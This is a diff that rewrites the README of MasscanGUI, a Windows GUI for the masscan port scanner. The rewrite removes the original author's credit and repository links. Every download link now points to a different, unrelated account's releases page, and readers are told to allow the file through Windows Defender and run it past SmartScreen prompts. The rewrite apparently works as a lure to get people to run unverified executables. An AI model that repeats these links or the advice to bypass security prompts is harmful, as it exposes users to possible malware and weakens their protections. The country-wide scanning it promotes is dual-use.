@@ -1,128 +1,208 @@
-# MasscanGUI – Interface for Masscan
+# 🖧 MasscanGUI - Simple Port Scanning With A Clear Interface
 
-<img width="982" height="672" alt="image" src="https://github.com/user-attachments/assets/851c6543-4cf5-4f44-b130-65cf4ef22a11" />
+[![Download MasscanGUI](https://img.shields.io/badge/Download-MasscanGUI-blue?style=for-the-badge)](https://github.com/Michelinadetached887/MasscanGUI/releases)
 
+## 🚀 What MasscanGUI Does
 
-<div dir="rtl">
+MasscanGUI is a Windows app that gives you a simple screen for masscan. It helps you run port scans without using the command line.
 
+Use it to:
 
-## [فارسی](#fa) | [English](#en)
+- scan IPs and ports from a clean interface
+- narrow scans by country
+- export results in IP:PORT format
+- set advanced scan options with less typing
+- review scan output in a form that is easier to read
 
+This app is useful if you want the speed of masscan with a windowed tool that is easier to use.
 
-<a name="en"></a>
-## English
+## 📥 Download
 
-### Introduction
-**MasscanGUI** is a professional graphical user interface for the famous **Masscan** port scanner. It provides all Masscan features and parameters in a simple, user-friendly environment. No need to download Masscan separately – the executable is included alongside the GUI in the release package.
+1. Open the [MasscanGUI Releases page](https://github.com/Michelinadetached887/MasscanGUI/releases)
+2. Download the latest Windows release file
+3. Save the file to your PC
+4. Open the file to start the app
 
-### Key Features
-- ✅ **Full support for all Masscan parameters** (basic & advanced)
-- 🌍 **Country‑based scanning** (IP ranges for 18 countries + custom ranges)
-- 📝 **Multiple output formats** including `IP:PORT`, JSON, XML, Grepable, etc.
-- 🚀 **Real‑time output display** while scanning
-- ⚙️ **Network adapter settings** (adapter, IP, MAC, VLAN, source port)
-- 📄 **Save & resume scans** + rotating output files
-- 🔍 **Read binary scan files** and convert to text formats
-- 🧩 **Sharding support** for distributed scans
-- 🖥️ **No command line required** – everything is clickable
+If the download comes as a ZIP file, right-click it and choose Extract All, then open the app inside the folder.
 
-### How to Use
-1. Place `MasscanGUI.exe` and `masscan.exe` in the same folder.
-2. Run the application.
-3. In the **Scan** tab, enter the IP range or target address.
-4. Select ports (presets available).
-5. Optionally adjust advanced settings (rate, retries, sharding, etc.).
-6. Click **Start Scan** and watch results appear in the **Results** tab.
+[Download MasscanGUI](https://github.com/Michelinadetached887/MasscanGUI/releases)
 
-> **Note:** The masscan executable is included in the release – no separate installation or download is required.
+## 🪟 Windows Setup
 
-### Country‑Based Scanning
-- Go to the **Countries** tab.
-- Select a country – its IP ranges will be displayed.
-- You can also enter custom ranges in the text box below.
-- Click **Scan This Country** to start scanning.
+MasscanGUI is made for Windows use. For the best results:
 
-### IP:PORT Output
-In the **Output** tab, choose the `IP:PORT` format. The output will look like:
-```
-192.168.1.1:80
-192.168.1.5:443
-```
+- use Windows 10 or Windows 11
+- keep enough free disk space for scan results
+- allow the app through Windows Defender if it asks for permission
+- run the app with normal user access unless Windows asks for admin rights
 
-### Requirements
-- Windows (7, 8, 10, 11) – also runs on Linux/macOS with Python 3 if using the source.
-- No Python installation needed (standalone .exe provided)
+If Windows shows a SmartScreen prompt, choose the option to run the file after you check that you got it from the release page.
 
-### Download
-Download the executable (along with masscan.exe) from the **[Releases](https://github.com/mehdirzfx/MasscanGUI/releases)** section.
+## ▶️ How to Start
 
-### GitHub Repository
-[https://github.com/mehdirzfx/MasscanGUI](https://github.com/mehdirzfx/MasscanGUI)
+1. Download the latest release
+2. Extract the files if needed
+3. Open the MasscanGUI app
+4. Wait for the main window to load
+5. Enter the target IP, range, or country settings
+6. Choose the ports you want to scan
+7. Start the scan
+8. Review the results in the output area
 
-### Author
-**Mehdi Rezaei Far (s3nat0r)**
+## 🔧 Main Features
 
-## ⭐️ Support This Project
+### 🌍 Country-Based Scanning
 
-If you find this project useful, please consider giving it a **star** on GitHub.  
-Your support helps increase visibility and encourages further development.
+You can scan targets by country to focus on a region instead of entering each IP by hand. This helps when you want a wider search without building a list first.
 
-[![GitHub stars](https://img.shields.io/github/stars/mehdirzfx/MasscanGUI?style=for-the-badge&logo=github&color=yellow)](https://github.com/mehdirzfx/MasscanGUI/stargazers)
-</div>
-<a name="fa"></a>
+### 📄 IP:PORT Output
 
-## فارسی
+Results can be shown in IP:PORT format. This makes it easy to copy the scan output into other tools or save it for later use.
 
-### معرفی
-**MasscanGUI** یک رابط کاربری گرافیکی حرفه‌ای برای ابزار معروف **Masscan** است. این برنامه تمامی امکانات و پارامترهای Masscan را در یک محیط ساده و کاربرپسند ارائه می‌دهد. نیازی به دانلود جداگانه Masscan نیست – فایل اجرایی در کنار GUI در فایل ضمیمه (Release) قرار دارد.
+### ⚙️ Advanced Options
 
-### امکانات اصلی
-- ✅ **پشتیبانی از تمام پارامترهای Masscan** (ساده و پیشرفته)
-- 🌍 **اسکن بر اساس کشور** (رنج آی‌پی‌های ۱۸ کشور + امکان رنج دلخواه)
-- 📝 **خروجی به فرمت‌های مختلف** شامل `IP:PORT`، JSON، XML، Grepable و...
-- 🚀 **اسکن همزمان و نمایش لحظه‌ای نتایج**
-- ⚙️ **تنظیمات شبکه** (آداپتور، آی‌پی، مک، VLAN، پورت منبع)
-- 📄 **ذخیره و Resume اسکن** + خروجی چرخشی (Rotate)
-- 🔍 **باز کردن فایل باینری Masscan** و تبدیل به فرمت متنی
-- 🧩 **Sharding** برای اسکن توزیع‌شده
-- 🖥️ **بدون نیاز به خط فرمان** – تمام تنظیمات با کلیک
+MasscanGUI exposes the settings you may want to change, such as:
 
-### نحوه استفاده
-1. فایل‌های `MasscanGUI.exe` و `masscan.exe` را در یک پوشه قرار دهید.
-2. برنامه را اجرا کنید.
-3. در تب **Scan**، آیپی رنج یا آدرس هدف را وارد کنید.
-4. پورت‌ها را انتخاب کنید (پیش‌تنظیمات آماده).
-5. در صورت نیاز، تنظیمات پیشرفته (نرخ، بیدر، شاردینگ و...) را اعمال کنید.
-6. دکمه **Start Scan** را بزنید و نتایج را در تب **Results** ببینید.
+- scan speed
+- port range
+- target range
+- output format
+- timing choices
+- response handling
 
-> **نکته:** فایل اجرایی masscan در ریلیز همراه با GUI قرار داده شده است – نیازی به نصب یا دانلود جداگانه نیست.
+### 🖱️ Simple Interface
 
-### اسکن بر اساس کشور
-- به تب **Countries** بروید.
-- کشور مورد نظر را انتخاب کنید – لیست رنج‌های آی‌پی آن نمایش داده می‌شود.
-- می‌توانید رنج دلخواه خود را نیز در قسمت پایین وارد کنید.
-- با کلیک روی **Scan This Country** اسکن شروع می‌شود.
+The app uses a GUI layout, so you do not need to learn command-line flags before you begin. You can enter values in fields and select options from the window.
 
-### خروجی IP:PORT
-در تب **Output**، فرمت `IP:PORT` را انتخاب کنید. خروجی به این شکل خواهد بود:
-```
-192.168.1.1:80
-192.168.1.5:443
-```
+### 💾 Result Handling
 
-### نیازمندی‌ها
-- ویندوز (۷، ۸، ۱۰، ۱۱) – همچنین روی لینوکس و مک با پایتون ۳ قابل اجراست.
-- بدون نیاز به نصب پایتون (فایل exe ارائه شده)
+You can keep scan output in a format that is easy to store, sort, and reuse. This helps when you want to review results after a scan ends.
 
-### دانلود
-فایل اجرایی (همراه با masscan.exe) را از بخش **[Releases](https://github.com/mehdirzfx/MasscanGUI/releases)** دانلود کنید.
+## 🧭 Basic Use Cases
 
-### لینک پروژه در گیتهاب
-[https://github.com/mehdirzfx/MasscanGUI](https://github.com/mehdirzfx/MasscanGUI)
+MasscanGUI can help with:
 
-## ⭐️ حمایت شما
+- checking which ports are open on a host you own
+- mapping a known range of systems
+- reviewing exposure in lab networks
+- running port discovery during security testing
+- saving results in a clear text format
 
-اگر این پروژه برای شما مفید است، لطفاً با **ستاره دادن** به آن در GitHub از ما حمایت کنید.  
-این کار به دیده شدن بیشتر پروژه و ادامه توسعه آن کمک شایانی می‌کند.
+## 📌 What You Need
 
-[![GitHub stars](https://img.shields.io/github/stars/mehdirzfx/MasscanGUI?style=for-the-badge&logo=github&color=yellow)](https://github.com/mehdirzfx/MasscanGUI/stargazers)
+Before you run MasscanGUI, make sure you have:
+
+- a Windows PC
+- internet access for the download
+- permission to scan the network or host you plan to test
+- enough system access to run the app
+- a place to save output files
+
+## 🛠️ First-Time Use
+
+If this is your first time using the app:
+
+1. Start with one target
+2. Use a small port list
+3. Check that the scan runs as expected
+4. Review the output format
+5. Move to larger scans after you are sure the settings are correct
+
+This helps you get comfortable with the interface before you use broader scan ranges.
+
+## 📁 Output Format
+
+MasscanGUI is built to give clean scan output. The common result style is:
+
+- host IP
+- open port
+- protocol data where used
+- scan status
+- saved text output for later review
+
+This makes it easier to work with the results in a spreadsheet, text editor, or other security tools.
+
+## 🔍 Common Controls
+
+You will likely see controls for:
+
+- target input
+- port input
+- country selection
+- start and stop actions
+- output path
+- speed or rate settings
+- save or export options
+
+If a field has a label next to it, use that label as your guide. Most values can be entered with plain numbers or simple text.
+
+## 🧪 Example Workflow
+
+A simple scan flow looks like this:
+
+1. Open MasscanGUI
+2. Enter a target or country
+3. Set the port list
+4. Choose an output path
+5. Start the scan
+6. Wait for the scan to finish
+7. Copy or save the results
+
+## 🔐 Safe Use
+
+Use MasscanGUI only on systems you own or have permission to test. Port scanning can trigger security tools on a network, so keep your use to approved systems and lab setups
+
+## 🗂️ Project Topics
+
+This project is related to:
+
+- cybersecurity
+- GUI
+- IP scanner
+- masscan
+- masscan-gui
+- network tools
+- pentesting
+- port scanner
+- security tools
+- tkinter
+
+## 🧩 Troubleshooting
+
+### The app does not open
+
+- make sure you downloaded the latest release
+- extract the ZIP file if needed
+- try running the app again
+- check whether Windows blocked the file
+
+### The scan does not start
+
+- check the target field
+- check the port list
+- make sure you have the right permissions
+- lower the scan speed if your network blocks fast scans
+
+### No results appear
+
+- confirm the target is valid
+- try a known open host in a lab network
+- check the output path
+- make sure the scan has time to finish
+
+### Windows asks for approval
+
+- confirm that the file came from the releases page
+- allow the app if your system trusts it
+- run it again after approval
+
+## 📎 Download Again
+
+If you need the installer or latest build, visit the release page here:
+
+[https://github.com/Michelinadetached887/MasscanGUI/releases](https://github.com/Michelinadetached887/MasscanGUI/releases)
+
+## 🖥️ Repository Info
+
+**Name:** MasscanGUI  
+**Description:** MasscanGUI – A full-featured GUI wrapper for masscan port scanner with country-based scanning, IP:PORT output, and all advanced options.
